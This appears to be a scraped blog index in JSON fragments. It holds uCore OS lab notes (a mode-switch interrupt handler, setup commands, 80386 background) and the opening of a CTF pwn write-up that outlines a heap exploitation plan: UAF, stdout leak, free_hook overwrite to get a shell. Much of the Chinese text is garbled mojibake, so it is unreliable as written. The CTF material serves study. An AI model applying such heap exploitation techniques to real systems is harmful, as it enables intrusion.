","date":"2021-07-10","objectID":"/ucore-lab-1/:7:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#challenge-1"},{"categories":["Pwning"],"content":"Challenge 2ä½¿ç”¨é”®ç›˜å®Œæˆç”¨æˆ·æ€ä¸å†…æ ¸æ€çš„åˆ‡æ¢ case IRQ_OFFSET + IRQ_KBD: c = cons_getc(); // ä»æ§åˆ¶å°è·å–é”®ç›˜æ¶ˆæ¯ cprintf(\"kbd [%03d] %c\\n\", c, c); if(c == '0') // è¾“å…¥ 0 è¿›è¡Œ ç”¨æˆ·æ€åˆ°å†…æ ¸æ€çš„åˆ‡æ¢ { if (tf-\u003etf_cs != KERNEL_CS) { cprintf(\"+++ switch to kernel mode +++\\n\"); tf-\u003etf_cs = KERNEL_CS; tf-\u003etf_ds = tf-\u003etf_es = KERNEL_DS; tf-\u003etf_eflags \u0026= ~FL_IOPL_MASK; switchu2k = (struct trapframe *)(tf-\u003etf_esp - (sizeof(struct trapframe) - 8)); memmove(switchu2k, tf, sizeof(struct trapframe) - 8); *((uint32_t *)tf - 1) = (uint32_t)switchu2k; } } else if(c == '3') // è¾“å…¥ 3 è¿›è¡Œ å†…æ ¸æ€åˆ°ç”¨æˆ·æ€çš„åˆ‡æ¢ { if (tf-\u003etf_cs != USER_CS) { cprintf(\"+++ switch to user mode +++\\n\"); switchk2u = *tf; switchk2u.tf_cs = USER_CS; switchk2u.tf_ds = switchk2u.tf_es = switchk2u.tf_ss = USER_DS; switchk2u.tf_esp = (uint32_t)tf + sizeof(struct trapframe) - 8; switchk2u.tf_eflags |= FL_IOPL_MASK; *((uint32_t *)tf - 1) = (uint32_t)\u0026switchk2u; } } break; åˆ‡æ¢éƒ¨åˆ†çš„ä»£ç ä¸challenge1ç›¸åŒã€‚ check neibelungen@neibelungen:~/os_kernel_lab/labcodes/lab1$ make grade Check Output: (2.5s) -check ring 0: OK -check switch to ring 3: OK -check switch to ring 0: OK -check ticks: OK Total Score: 40/40 ","date":"2021-07-10","objectID":"/ucore-lab-1/:8:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#challenge-2"},{"categories":["Pwning"],"content":"æ¦‚è¿° åœ¨å­¦ä¹ ä¸€ä¸ªä¸œè¥¿ä¹‹å‰ï¼Œæˆ‘éƒ½å–œæ¬¢æ€è€ƒï¼Œè¿™ä¸ªä¸œè¥¿è§£å†³äº†ä»€ä¹ˆé—®é¢˜ï¼Ÿ æ‰€æœ‰çš„æŠ€æœ¯éƒ½ä¸æ˜¯æ— æ•…äº§ç”Ÿçš„ï¼Œé¢å‘é—®é¢˜çš„å­¦ä¹ èƒ½æ›´å¥½çš„ç†è§£å®ƒçš„è®¾è®¡æ€è·¯ã€‚ æ“ä½œç³»ç»Ÿæ˜¯ç³»ç»Ÿè½¯ä»¶ï¼Œåœ¨ç¡¬ä»¶å±‚ä¸åº”ç”¨è½¯ä»¶ä¹‹é—´ã€‚ ä¸ºä»€ä¹ˆéœ€è¦æ“ä½œç³»ç»Ÿï¼Ÿ ä¸ºç”¨æˆ·æä¾›æ›´åŠ æ–¹ä¾¿çš„ä½¿ç”¨è®¡ç®—æœºçš„æ–¹å¼ã€‚å¯¹èµ„æºè¿›è¡Œæœ‰æ•ˆçš„ç®¡ç†ã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-0/:0:0","series":null,"tags":["Pwn"],"title":"UCore Lab 0","uri":"/ucore-lab-0/#æ¦‚è¿°"},{"categories":["Pwning"],"content":"å†…æ ¸ç‰¹å¾ å¹¶å‘ è®¡ç®—æœºç³»ç»Ÿä¸­æœ‰å¤šä¸ªæ­£åœ¨è¿è¡Œçš„ç¨‹åºï¼Œéœ€è¦OSçš„ç®¡ç†å’Œè°ƒåº¦ã€‚ç»´æŠ¤æ¯ä¸ªè¿›ç¨‹çš„çŠ¶æ€ï¼ˆå¯„å­˜å™¨å€¼ï¼Œå½“å‰æ‰§è¡Œçš„æŒ‡ä»¤ç­‰ï¼‰ï¼Œå¹¶åœ¨ä¸åŒè¿›è¡Œä¹‹é—´è¿›è¡Œåˆ‡æ¢ï¼ˆåˆ‡æ¢ç”±å†…æ ¸æ€å®Œæˆåï¼Œå›åˆ°ç”¨æˆ·æ€ï¼‰ å…±äº« å®è§‚ä¸Šï¼Œä½“ç°å„è¿›ç¨‹â€œåŒæ—¶â€è®¿é—®å¾®è§‚ä¸Šï¼Œäº’æ–¥å…±äº«ã€‚åŒä¸€æ—¶åˆ»ä»…æœ‰ä¸€ä¸ªè¿›ç¨‹åœ¨è®¿é—®å†…å­˜ã€‚ ç³»ç»Ÿæ€»çº¿åªæœ‰ä¸€æ¡ï¼Œä¸å…è®¸å¤šè¿›ç¨‹åŒæ—¶è®¿é—®ã€‚ è™šæ‹Ÿ åˆ©ç”¨å¤šé“ç¨‹åºè®¾è®¡æŠ€æœ¯ï¼Œè®©æ¯ä¸ªè¿›ç¨‹éƒ½è§‰å¾—è®¡ç®—æœºæ˜¯ä¸ºè¯¥è¿›ç¨‹ç‹¬å çš„ å¼‚æ­¥ ç¨‹åºçš„æ‰§è¡Œä¸æ˜¯ä¸€è´¯åˆ°åº•çš„ï¼Œè€Œæ˜¯èµ°èµ°åœåœï¼Œå‘å‰æ¨è¿›çš„é€Ÿåº¦ä¸å¯é¢„çŸ¥ åªè¦è¿è¡Œç¯å¢ƒç›¸åŒï¼ŒOSéœ€è¦ä¿è¯ç¨‹åºè¿è¡Œçš„ç»“æœæ˜¯ç›¸åŒçš„ ","date":"2021-07-10","objectID":"/ucore-lab-0/:1:0","series":null,"tags":["Pwn"],"title":"UCore Lab 0","uri":"/ucore-lab-0/#å†…æ ¸ç‰¹å¾"},{"categories":["Pwning"],"content":"Lab 0ï¼šå®éªŒç¯å¢ƒçš„æ­å»ºå¯ä»¥ä½¿ç”¨è¯¾ç¨‹æä¾›çš„å®Œæ•´çš„VMboxç¯å¢ƒï¼ŒåŸºäºUbuntu 14.04ã€‚è¿™ä¸ªé•œåƒæ˜¯2015å¹´åˆ›å»ºçš„ï¼Œæ‰€ä»¥ä½¿ç”¨ç‰ˆæœ¬è¾ƒè€ã€‚ è¿™é‡Œæˆ‘ä½¿ç”¨Ubuntu 20.04è¿›è¡Œï¼Œå½“ç„¶å¦‚æœä½ å¯ä»¥ä½¿ç”¨å…¶ä»–çš„ç‰ˆæœ¬ï¼ˆ14.04+ï¼‰ã€‚è™šæ‹Ÿæœºçš„å®‰è£…ç•¥è¿‡ ","date":"2021-07-10","objectID":"/ucore-lab-0/:0:0","series":null,"tags":["Pwn"],"title":"UCore Lab 0","uri":"/ucore-lab-0/#lab-0å®éªŒç¯å¢ƒçš„æ­å»º"},{"categories":["Pwning"],"content":"æ¢æºå¤‡ä»½åŸæ¥çš„æº sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak æ‰“å¼€/etc/apt/sources.listæ–‡ä»¶ sudo gedit /etc/apt/sources.list åœ¨å‰é¢æ·»åŠ å¦‚ä¸‹æ¡ç›®ï¼Œå¹¶ä¿å­˜ # aliyun deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse ç„¶å sudo apt update sudo apt upgrade ","date":"2021-07-10","objectID":"/ucore-lab-0/:1:0","series":null,"tags":["Pwn"],"title":"UCore Lab 0","uri":"/ucore-lab-0/#æ¢æº"},{"categories":["Pwning"],"content":"å·¥å…·å®‰è£… sudo apt-get install build-essential git qemu-system vim gdb cgdb make diffutils exuberant-ctags tmux openssh-server cscope meld qgit gitg gcc-multilib gcc-multilib g++-multilib ä¸å®˜æ–¹çš„å¹¶ä¸æ˜¯å®Œå…¨ä¸€æ ·ï¼Œåœ¨ubuntu20.04ä¸­eclipse-cdtæ”¹å˜äº†å®‰è£…æ–¹å¼ï¼Œvimç”±vim-gnomeæ”¹ä¸ºvimã€‚ è¿™é‡Œæˆ‘åˆå®‰è£…äº†gdbçš„æ‹“å±•pedaï¼ˆåœ¨ctfä¸­ç»å¸¸ç”¨åˆ°ï¼‰ï¼Œpwndbgåœ¨åé¢å‘ç°æ²¡æ³•ä½¿ç”¨ã€‚ git clone https://github.com/longld/peda.git ~/peda echo \"source ~/peda/peda.py\" \u003e\u003e ~/.gdbinit echo \"DONE! debug your program with gdb and enjoy\" vs codeç”¨æ¥å†™ä»£ç  sudo apt install snapd -y sudo snap install --classic code ","date":"2021-07-10","objectID":"/ucore-lab-0/:2:0","series":null,"tags":["Pwn"],"title":"UCore Lab 0","uri":"/ucore-lab-0/#å·¥å…·å®‰è£…"},{"categories":["Pwning"],"content":"Intel 80386åŸºç¡€çŸ¥è¯†","date":"2021-07-10","objectID":"/ucore-lab-0/:3:0","series":null,"tags":["Pwn"],"title":"UCore Lab 0","uri":"/ucore-lab-0/#intel-80386åŸºç¡€çŸ¥è¯†"},{"categories":["Pwning"],"content":"è¿è¡Œæ¨¡å¼ å®æ¨¡å¼ ä¸ºäº†å…¼å®¹æ—©æœŸ16ä½8086 80386åŠ ç”µå¯åŠ¨åå¤„äºå®æ¨¡å¼è¿è¡ŒçŠ¶æ€ï¼Œåœ¨è¿™ç§çŠ¶æ€ä¸‹è½¯ä»¶å¯è®¿é—®çš„ç‰©ç†å†…å­˜ä¸èƒ½è¶…è¿‡1MBï¼Œä¸”æ— æ³•å‘æŒ¥Intel 80386ä»¥ä¸Šçº§åˆ«çš„32ä½CPUçš„4GBå†…å­˜ç®¡ç†èƒ½åŠ› ä¿æŠ¤æ¨¡å¼ æ”¯æŒå†…å­˜åˆ†é¡µæœºåˆ¶ï¼Œæä¾›äº†å¯¹è™šæ‹Ÿå†…å­˜çš„è‰¯å¥½æ”¯æŒã€‚ä¿æŠ¤æ¨¡å¼ä¸‹80386æ”¯æŒå¤šä»»åŠ¡ï¼Œè¿˜æ”¯æŒä¼˜å…ˆçº§æœºåˆ¶ï¼Œä¸åŒç¨‹åºè¿è¡Œåœ¨ä¸åŒçš„ä¼˜å…ˆçº§ä¸Šã€‚ä¼˜å…ˆçº§ä¸€å…±åˆ†0-3 4ä¸ªçº§åˆ«ï¼Œæ“ä½œç³»ç»Ÿè¿è¡Œåœ¨æœ€é«˜çš„çš„ä¼˜å…ˆçº§0ä¸Šï¼Œåº”ç”¨ç¨‹åºåˆ™è¿è¡Œåœ¨æ¯”è¾ƒä½çš„çº§åˆ«ä¸Šï¼›é…åˆè‰¯å¥½çš„æ£€æŸ¥æœºåˆ¶åï¼Œæ—¢å¯ä»¥å­å•Šä»»åŠ¡é—´å®ç°æ•°æ®çš„å®‰å…¨å…±äº«ä¹Ÿå¯ä»¥å¾ˆå¥½åœ°éš”ç¦»å„ä¸ªä»»åŠ¡ã€‚ SMMæ¨¡å¼ è™šæ‹Ÿ8086æ¨¡å¼ ","date":"2021-07-10","objectID":"/ucore-lab-0/:3:1","series":null,"tags":["Pwn"],"title":"UCore Lab 0","uri":"/ucore-lab-0/#è¿è¡Œæ¨¡å¼"},{"categories":["Pwning"],"content":"å†…å­˜æ¶æ„åœ°å€æ˜¯è®¿é—®å†…å­˜ç©ºé—´çš„ç´¢å¼• ä¸€ä¸ªåœ°å€å¯¹åº”ä¸€ä¸ªå­—èŠ‚ï¼Œå€Ÿç”¨CSAPPçš„è¯ï¼Œä½ å¯ä»¥å°†å†…å­˜çœ‹æˆæ•°ç»„ï¼Œåœ°å€å¯¹åº”äº†ä¸‹æ ‡ã€‚ ä¸€èˆ¬è€Œè¨€ï¼Œå†…å­˜åœ°å€æœ‰ä¸¤ä¸ªï¼šä¸€ä¸ªæ˜¯CPUé€šè¿‡æ€»çº¿è®¿é—®ç‰©ç†å†…å­˜ç”¨åˆ°çš„ç‰©ç†åœ°å€ï¼Œä¸€ä¸ªæ˜¯æˆ‘ä»¬ç¼–å†™çš„åº”ç”¨ç¨‹åºæ‰€ç”¨åˆ°çš„ä¸ºè™šæ‹Ÿåœ°å€ï¼ˆä¹Ÿç§°é€»è¾‘åœ°å€ï¼‰ã€‚çœ‹ä¸‹é¢çš„ç¨‹åºï¼š int a = 5; int *addr = \u0026a; æŒ‡é’ˆaddrä¿å­˜äº†å˜é‡açš„åœ°å€ï¼Œè¿™ä¸ªåœ°å€å°±æ˜¯è™šæ‹Ÿåœ°å€ã€‚ 80386æ˜¯32ä½çš„å¤„ç†å™¨ï¼Œå³å¯ä»¥å¯»å€çš„ç‰©ç†å†…å­˜åœ°å€ç©ºé—´ä¸º$2^{32}=4$å­—èŠ‚ã€‚ä¸ºæ›´å¥½ç†è§£é¢å‘80386å¤„ç†å™¨çš„ucoreæ“ä½œç³»ç»Ÿï¼Œéœ€è¦ç”¨åˆ°ä¸‰ä¸ªåœ°å€ç©ºé—´çš„æ¦‚å¿µï¼šç‰©ç†åœ°å€ã€çº¿æ€§åœ°å€å’Œè™šæ‹Ÿåœ°å€ã€‚ç‰©ç†å†…å­˜åœ°å€ç©ºé—´æ˜¯å¤„ç†å™¨æäº¤åˆ°æ€»çº¿ä¸Šç”¨äºè®¿é—®è®¡ç®—æœºç³»ç»Ÿä¸­çš„å†…å­˜å’Œå¤–è®¾çš„æœ€ç»ˆåœ°å€ã€‚ä¸€ä¸ªè®¡ç®—æœºç³»ç»Ÿä¸­åªæœ‰ä¸€ä¸ªç‰©ç†åœ°å€ç©ºé—´ã€‚çº¿æ€§åœ°å€ç©ºé—´æ˜¯80386å¤„ç†å™¨é€šè¿‡æ®µï¼ˆSegmentï¼‰æœºåˆ¶æ§åˆ¶ä¸‹çš„å½¢æˆçš„åœ°å€ç©ºé—´ã€‚åœ¨æ“ä½œç³»ç»Ÿçš„ç®¡ç†ä¸‹ï¼Œæ¯ä¸ªè¿è¡Œçš„åº”ç”¨ç¨‹åºæœ‰ç›¸å¯¹ç‹¬ç«‹çš„ä¸€ä¸ªæˆ–å¤šä¸ªå†…å­˜ç©ºé—´æ®µï¼Œæ¯ä¸ªæ®µæœ‰å„è‡ªçš„èµ·å§‹åœ°å€å’Œé•¿åº¦å±æ€§ï¼Œå¤§å°ä¸å›ºå®šï¼Œè¿™æ ·å¯è®©å¤šä¸ªè¿è¡Œçš„åº”ç”¨ç¨‹åºä¹‹é—´ç›¸äº’éš”ç¦»ï¼Œå®ç°å¯¹åœ°å€ç©ºé—´çš„ä¿æŠ¤ã€‚ åœ¨æ“ä½œç³»ç»Ÿå®Œæˆå¯¹80386å¤„ç†å™¨æ®µæœºåˆ¶çš„åˆå§‹åŒ–å’Œé…ç½®ï¼ˆä¸»è¦æ˜¯éœ€è¦æ“ä½œç³»ç»Ÿé€šè¿‡ç‰¹å®šçš„æŒ‡ä»¤å’Œæ“ä½œå»ºç«‹å…¨å±€æè¿°ç¬¦è¡¨ï¼Œå®Œæˆè™šæ‹Ÿåœ°å€ä¸çº¿æ€§åœ°å€çš„æ˜ å°„å…³ç³»ï¼‰åï¼Œ80386å¤„ç†å™¨çš„æ®µç®¡ç†åŠŸèƒ½å•å…ƒè´Ÿè´£æŠŠè™šæ‹Ÿåœ°å€è½¬æ¢æˆçº¿æ€§åœ°å€ï¼Œåœ¨æ²¡æœ‰ä¸‹é¢ä»‹ç»çš„é¡µæœºåˆ¶å¯åŠ¨çš„æƒ…å†µä¸‹ï¼Œè¿™ä¸ªçº¿æ€§åœ°å€å°±æ˜¯ç‰©ç†åœ°å€ã€‚ ç›¸å¯¹è€Œè¨€ï¼Œæ®µæœºåˆ¶å¯¹å¤§é‡åº”ç”¨ç¨‹åºåˆ†æ•£åœ°ä½¿ç”¨å¤§å†…å­˜çš„æ”¯æŒèƒ½åŠ›è¾ƒå¼±ã€‚æ‰€ä»¥Intelå…¬å¸åˆåŠ å…¥äº†é¡µæœºåˆ¶ï¼Œæ¯ä¸ªé¡µçš„å¤§å°æ˜¯å›ºå®šçš„ï¼ˆä¸€èˆ¬ä¸º4KBï¼‰ï¼Œä¹Ÿå¯å®Œæˆå¯¹å†…å­˜å•å…ƒçš„å®‰å…¨ä¿æŠ¤ï¼Œéš”ç¦»ï¼Œä¸”å¯æœ‰æ•ˆæ”¯æŒå¤§é‡åº”ç”¨ç¨‹åºåˆ†æ•£åœ°ä½¿ç”¨å¤§å†…å­˜çš„æƒ…å†µã€‚ åœ¨æ“ä½œç³»ç»Ÿå®Œæˆå¯¹80386å¤„ç†å™¨é¡µæœºåˆ¶çš„åˆå§‹åŒ–å’Œé…ç½®ï¼ˆä¸»è¦æ˜¯éœ€è¦æ“ä½œç³»ç»Ÿé€šè¿‡ç‰¹å®šçš„æŒ‡ä»¤å’Œæ“ä½œå»ºç«‹é¡µè¡¨ï¼Œå®Œæˆè™šæ‹Ÿåœ°å€ä¸çº¿æ€§åœ°å€çš„æ˜ å°„å…³ç³»ï¼‰åï¼Œåº”ç”¨ç¨‹åºçœ‹åˆ°çš„è™šæ‹Ÿåœ°å€å…ˆè¢«å¤„ç†å™¨ä¸­çš„æ®µç®¡ç†åŠŸèƒ½å•å…ƒè½¬æ¢ä¸ºçº¿æ€§åœ°å€ï¼Œç„¶åå†é€šè¿‡80386å¤„ç†å™¨ä¸­çš„é¡µç®¡ç†åŠŸèƒ½å•å…ƒæŠŠçº¿æ€§åœ°å€è½¬æ¢æˆç‰©ç†åœ°å€ã€‚ é¡µæœºåˆ¶å’Œæ®µæœºåˆ¶æœ‰ä¸€å®šç¨‹åº¦çš„åŠŸèƒ½é‡å¤ï¼Œä½†Intelå…¬å¸ä¸ºäº†å‘ä¸‹å…¼å®¹ç­‰ç›®æ ‡ï¼Œä½¿å¾—è¿™ä¸¤è€…ä¸€ç›´å…±å­˜ã€‚ ä¸Šè¿°ä¸‰ç§åœ°å€çš„å…³ç³»å¦‚ä¸‹ï¼š åˆ†æ®µæœºåˆ¶å¯åŠ¨ã€åˆ†é¡µæœºåˆ¶æœªå¯åŠ¨ï¼šé€»è¾‘åœ°å€â€”\u003eæ®µæœºåˆ¶å¤„ç†â€”\u003eçº¿æ€§åœ°å€=ç‰©ç†åœ°å€ åˆ†æ®µæœºåˆ¶å’Œåˆ†é¡µæœºåˆ¶éƒ½å¯åŠ¨ï¼šé€»è¾‘åœ°å€â€”\u003eæ®µæœºåˆ¶å¤„ç†â€”\u003eçº¿æ€§åœ°å€â€”\u003eé¡µæœºåˆ¶å¤„ç†â€”\u003eç‰©ç†åœ°å€ ","date":"2021-07-10","objectID":"/ucore-lab-0/:3:2","series":null,"tags":["Pwn"],"title":"UCore Lab 0","uri":"/ucore-lab-0/#å†…å­˜æ¶æ„"},{"categories":["Pwning"],"content":"å¯„å­˜å™¨å¦‚æœå¯¹æ±‡ç¼–æ¯”è¾ƒç†Ÿæ‚‰å¯ä»¥ç›´æ¥è·³è¿‡ 80386çš„å¯„å­˜å™¨å¯ä»¥åˆ†ä¸º8ç»„ï¼šé€šç”¨å¯„å­˜å™¨ï¼Œæ®µå¯„å­˜å™¨ï¼ŒæŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨ï¼Œæ ‡å¿—å¯„å­˜å™¨ï¼Œç³»ç»Ÿåœ°å€å¯„å­˜å™¨ï¼Œæ§åˆ¶å¯„å­˜å™¨ï¼Œè°ƒè¯•å¯„å­˜å™¨ï¼Œæµ‹è¯•å¯„å­˜å™¨ï¼Œå®ƒä»¬çš„å®½åº¦éƒ½æ˜¯32ä½ã€‚ä¸€èˆ¬ç¨‹åºå‘˜çœ‹åˆ°çš„å¯„å­˜å™¨åŒ…æ‹¬é€šç”¨å¯„å­˜å™¨ï¼Œæ®µå¯„å­˜å™¨ï¼ŒæŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨ï¼Œæ ‡å¿—å¯„å­˜å™¨ã€‚ æ”¾å‡ºæˆ‘æœ€å–œæ¬¢çš„å›¾ï¼ˆå›¾ä¸­å±•ç¤ºäº†64ä½å¯„å­˜å™¨åˆ°8ä½å¯„å­˜å™¨çš„ç»“æ„ï¼Œæ›´é«˜çº§çš„CPUè¿˜æœ‰åª’ä½“å¯„å­˜å™¨ï¼‰ EAXï¼šç´¯åŠ å™¨ EBXï¼šåŸºå€å¯„å­˜å™¨ ECXï¼šè®¡æ•°å™¨ EDXï¼šæ•°æ®å¯„å­˜å™¨ ESIï¼šæºåœ°å€æŒ‡é’ˆå¯„å­˜å™¨ EDIï¼šç›®çš„åœ°å€æŒ‡é’ˆå¯„å­˜å™¨ EBPï¼šåŸºå€æŒ‡é’ˆå¯„å­˜å™¨ ESPï¼šå †æ ˆæŒ‡é’ˆå¯„å­˜å™¨ Segment Register(æ®µå¯„å­˜å™¨ï¼Œä¹Ÿç§° Segment Selectorï¼Œæ®µé€‰æ‹©ç¬¦ï¼Œæ®µé€‰æ‹©å­)ï¼šé™¤äº†8086çš„4ä¸ªæ®µå¤–(CS,DS,ES,SS)ï¼Œ80386è¿˜å¢åŠ äº†ä¸¤ä¸ªæ®µFSï¼ŒGS,è¿™äº›æ®µå¯„å­˜å™¨éƒ½æ˜¯16ä½çš„ï¼Œç”¨äºä¸åŒå±æ€§å†…å­˜æ®µçš„å¯»å€ï¼Œå®ƒä»¬çš„å«ä¹‰å¦‚ä¸‹ï¼š CSï¼šä»£ç æ®µ(Code Segment) DSï¼šæ•°æ®æ®µ(Data Segment) ESï¼šé™„åŠ æ•°æ®æ®µ(Extra Segment) SSï¼šå †æ ˆæ®µ(Stack Segment) FSï¼šé™„åŠ æ®µ GS é™„åŠ æ®µ Instruction Pointer(æŒ‡ä»¤æŒ‡é’ˆå¯„å­˜å™¨ï¼ŒPC)ï¼šEIPçš„ä½16ä½å°±æ˜¯8086çš„IPï¼Œå®ƒå­˜å‚¨çš„æ˜¯ä¸‹ä¸€æ¡è¦æ‰§è¡ŒæŒ‡ä»¤çš„å†…å­˜åœ°å€ï¼Œåœ¨åˆ†æ®µåœ°å€è½¬æ¢ä¸­ï¼Œè¡¨ç¤ºæŒ‡ä»¤çš„æ®µå†…åç§»åœ°å€ã€‚ Flag Register(æ ‡å¿—å¯„å­˜å™¨)ï¼šEFLAGS,å’Œ8086çš„16ä½æ ‡å¿—å¯„å­˜å™¨ç›¸æ¯”ï¼Œå¢åŠ äº†4ä¸ªæ§åˆ¶ä½ CF(Carry Flag)ï¼šè¿›ä½æ ‡å¿—ä½ï¼› PF(Parity Flag)ï¼šå¥‡å¶æ ‡å¿—ä½ï¼› AF(Assistant Flag)ï¼šè¾…åŠ©è¿›ä½æ ‡å¿—ä½ï¼› ZF(Zero Flag)ï¼šé›¶æ ‡å¿—ä½ï¼› SF(Singal Flag)ï¼šç¬¦å·æ ‡å¿—ä½ï¼› IF(Interrupt Flag)ï¼šä¸­æ–­å…è®¸æ ‡å¿—ä½,ç”±CLIï¼ŒSTIä¸¤æ¡æŒ‡ä»¤æ¥æ§åˆ¶ï¼›è®¾ç½®IFä½ä½¿CPUå¯è¯†åˆ«å¤–éƒ¨ï¼ˆå¯å±è”½ï¼‰ä¸­æ–­è¯·æ±‚ï¼Œå¤ä½IFä½åˆ™ç¦æ­¢ä¸­æ–­ï¼ŒIFä½å¯¹ä¸å¯å±è”½å¤–éƒ¨ä¸­æ–­å’Œæ•…éšœä¸­æ–­çš„è¯†åˆ«æ²¡æœ‰ä»»ä½•ä½œç”¨ï¼› DF(Direction Flag)ï¼šå‘é‡æ ‡å¿—ä½ï¼Œç”±CLDï¼ŒSTDä¸¤æ¡æŒ‡ä»¤æ¥æ§åˆ¶ï¼› OF(Overflow Flag)ï¼šæº¢å‡ºæ ‡å¿—ä½ï¼› IOPL(I/O Privilege Level)ï¼šI/Oç‰¹æƒçº§å­—æ®µï¼Œå®ƒçš„å®½åº¦ä¸º2ä½,å®ƒæŒ‡å®šäº†I/OæŒ‡ä»¤çš„ç‰¹æƒçº§ã€‚å¦‚æœå½“å‰çš„ç‰¹æƒçº§åˆ«åœ¨æ•°å€¼ä¸Šå°äºæˆ–ç­‰äºIOPLï¼Œé‚£ä¹ˆI/OæŒ‡ä»¤å¯æ‰§è¡Œã€‚å¦åˆ™ï¼Œå°†å‘ç”Ÿä¸€ä¸ªä¿æŠ¤æ€§æ•…éšœä¸­æ–­ï¼› NT(Nested Task)ï¼šæ§åˆ¶ä¸­æ–­è¿”å›æŒ‡ä»¤IRETï¼Œå®ƒå®½åº¦ä¸º1ä½ã€‚è‹¥NT=0ï¼Œåˆ™ç”¨å †æ ˆä¸­ä¿å­˜çš„å€¼æ¢å¤EFLAGSï¼ŒCSå’ŒEIPä»è€Œå®ç°ä¸­æ–­è¿”å›ï¼›è‹¥NT=1ï¼Œåˆ™é€šè¿‡ä»»åŠ¡åˆ‡æ¢å®ç°ä¸­æ–­è¿”å›ã€‚åœ¨ucoreä¸­ï¼Œè®¾ç½®NTä¸º0ã€‚ ","date":"2021-07-10","objectID":"/ucore-lab-0/:3:3","series":null,"tags":["Pwn"],"title":"UCore Lab 0","uri":"/ucore-lab-0/#å¯„å­˜å™¨"},{"categories":["Pwning"],"content":"ç¼–ç¨‹æŠ€å·§åœ¨ç»“æ„ä½“ä¸­å®šä¹‰å‡½æ•°æŒ‡é’ˆå’Œæ•°æ®å½¢æˆè™šè¡¨ã€‚ code: lab2/kern/mm/pmm.h // pmm_manager is a physical memory management class. A special pmm manager - XXX_pmm_manager // only needs to implement the methods in pmm_manager class, then XXX_pmm_manager can be used // by ucore to manage the total physical memory space. struct pmm_manager { // XXX_pmm_manager's name const char *name; // initialize internal description\u0026management data structure // (free block list, number of free block) of XXX_pmm_manager void (*init)(void); // setup description\u0026management data structcure according to // the initial free physical memory space void (*init_memmap)(struct Page *base, size_t n); // allocate \u003e=n pages, depend on the allocation algorithm struct Page *(*alloc_pages)(size_t n); // free \u003e=n pages with \"base\" addr of Page descriptor structures(memlayout.h) void (*free_pages)(struct Page *base, size_t n); // return the number of free pages size_t (*nr_free_pages)(void); // check the correctness of XXX_pmm_manager void (*check)(void); }; å¯¹äºåŒå‘é“¾è¡¨çš„æŒ‡é’ˆåŸŸä½¿ç”¨ç»Ÿä¸€çš„ç»“æ„å®šä¹‰ã€‚ struct list_entry { struct list_entry *prev, *next; }; struct Var { type var_1; â€¦â€¦ list_entry_t link; }; ä½¿ç”¨æŒ‡é’ˆ+åç§»çš„æ–¹å¼è®¿é—®ç»“æ„ä½“ä¸å˜é‡ã€‚ // convert list entry to page #define le2page(le, member) \\ to_struct((le), struct Page, member) /* Return the offset of 'member' relative to the beginning of a struct type */ #define offsetof(type, member) \\ ((size_t)(\u0026((type *)0)-\u003emember)) /* * * to_struct - get the struct from a ptr * @ptr: a struct pointer of member * @type: the type of the struct this is embedded in * @member: the name of the member within the struct * */ #define to_struct(ptr, type, member) \\ ((type *)((char *)(ptr) - offsetof(type, member))) ","date":"2021-07-10","objectID":"/ucore-lab-0/:3:4","series":null,"tags":["Pwn"],"title":"UCore Lab 0","uri":"/ucore-lab-0/#ç¼–ç¨‹æŠ€å·§"},{"categories":["Writeups"],"content":"é¢˜æ€è·¯åŸºæœ¬éƒ½æ˜¯æœ€è¿‘è§è¿‡çš„ï¼Œæ­£å¥½å­¦ä¹ äº†ä¸€ä¸‹é«˜ç‰ˆæœ¬çš„å †åˆ©ç”¨ã€‚ç¬¬ä¸€ä¸ªakäº†pwnï¼Œè¿˜æ˜¯è¢«æŒ¤äº†ä¸‹å»ï¼Œä½“éªŒæå·®ã€‚ ","date":"2021-06-04","objectID":"/2021newsctf/:0:0","series":null,"tags":["Writeups"],"title":"2021NEWSCTF","uri":"/2021newsctf/#"},{"categories":["Writeups"],"content":"ntr_note","date":"2021-06-04","objectID":"/2021newsctf/:0:0","series":null,"tags":["Writeups"],"title":"2021NEWSCTF","uri":"/2021newsctf/#ntr_note"},{"categories":["Writeups"],"content":"checksec Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled RUNPATH: '/home/ctfpwn/Desktop/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/' æœ‰UAFï¼Œä½†æ˜¯æ²¡æœ‰showï¼Œè¿˜æ˜¯è¦æƒ³åŠæ³•æ³„éœ²libcçš„åœ°å€ã€‚çœ‹åˆ°åœ¨deleå’Œeditçš„æ—¶å€™éƒ½æ²¡æœ‰é™åˆ¶idxä¸ºè´Ÿæ•°çš„æƒ…å†µï¼Œæ‰€ä»¥ä¸€å¼€å§‹æƒ³ç›´æ¥ç¼–è¾‘stdoutçš„FIFEç»“æ„ï¼Œä½†æ˜¯æ€ä¹ˆè¯•éƒ½ä¸æˆåŠŸã€‚ æ‰€ä»¥åˆ©ç”¨double freeå’ŒUAFï¼Œé€šè¿‡çˆ†ç ´åŠå­—èŠ‚ï¼Œç”³è¯·tcacheï¼Œç„¶åå†çˆ†ç ´åŠå­—èŠ‚ç”³è¯·åˆ°_IO_2_1_stdout_ï¼Œä»è€Œleak libcåœ°å€ï¼Œç„¶åæ”¹free_hookä¸ºsystemï¼Œé€šè¿‡system('/bin/sh')æ¥get shellã€‚ é«˜ç‰ˆæœ¬ogè°ƒæ ˆæ²¡æœ‰ç”¨ï¼ˆæ¼ 